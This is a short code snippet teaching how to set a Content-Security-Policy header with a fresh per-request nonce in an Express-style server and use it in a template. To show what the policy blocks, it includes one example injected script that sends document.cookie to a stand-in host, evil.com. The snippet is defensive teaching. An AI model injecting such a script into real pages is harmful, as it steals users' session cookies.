# Snippet: CSP Header With a Per-Request Nonce

```js
// Server (Express-style): generate a fresh nonce per request, set it in both the header and the template
app.use((req, res, next) => {
  res.locals.nonce = crypto.randomBytes(16).toString('base64');
  res.setHeader(
    'Content-Security-Policy',
    [
      "default-src 'self'",
      `script-src 'self' 'nonce-${res.locals.nonce}'`, // only self-hosted scripts + this exact nonce
      "style-src 'self'",
      "object-src 'none'",
      "base-uri 'self'",
      "frame-ancestors 'none'",
    ].join('; ')
  );
  next();
});
```

```html
<!-- Rendered template: the nonce is injected into the one legitimate inline script -->
<script nonce="<%= nonce %>">
  window.__INITIAL_STATE__ = { userId: 42 };
</script>
```

```html
<!-- An attacker-injected inline script (via a hypothetical unescaped field elsewhere on the page)
     has no way to know this request's nonce (it's regenerated every response) — CSP blocks it: -->
<script>fetch('https://evil.com/steal?c=' + document.cookie)</script>
<!-- Browser console: "Refused to execute inline script because it violates the following
     Content Security Policy directive: script-src 'self' 'nonce-...' " -->
```
